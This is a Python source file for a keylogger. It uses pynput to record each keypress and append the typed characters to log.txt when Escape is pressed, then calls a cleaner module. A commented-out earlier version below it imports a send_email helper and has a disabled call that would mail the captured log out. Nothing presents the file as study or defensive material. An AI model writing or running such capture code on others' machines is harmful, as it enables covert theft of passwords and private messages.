from pynput.keyboard import Key, Listener
from KLcleaner import clean

keys = []

def update_log():
    with open('log.txt', mode='a') as file:  # Append mode to keep previous data
        for key in keys:
            k = str(key).replace("'", "")  # Clean single quotes around characters
            if k.find("space") > 0:  # If the key is space, replace it with a space
                file.write(' ')
            elif k.find("Key") == -1:  # Ignore special keys like shift, ctrl, etc.
                file.write(k)
        file.write('\n')  # Add a newline after each keypress
    keys.clear()  # Clear the list after writing to the file

def on_press(key):
    keys.append(key)

def on_release(key):
    if key == Key.esc:  # Stop the listener when escape is pressed
        update_log()
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

clean()





# from pynput.keyboard import Key, Listener # Log the data
# from send_email import send_email # Send the data through Email
# from KLcleaner import clean # Clean The data

# keys = []
# def update_log():
#     with open('log.txt', mode='w') as file:
#         file.writelines(str(keys))

# def on_press(key):
#     # print(key)
#     keys.append(key)

# def on_release(key):
#     if key==Key.esc:
#         update_log()
#         # send_email()
#         return False

# with Listener(on_press=on_press, on_release=on_release) as listener:
#     listener.join()

# clean()




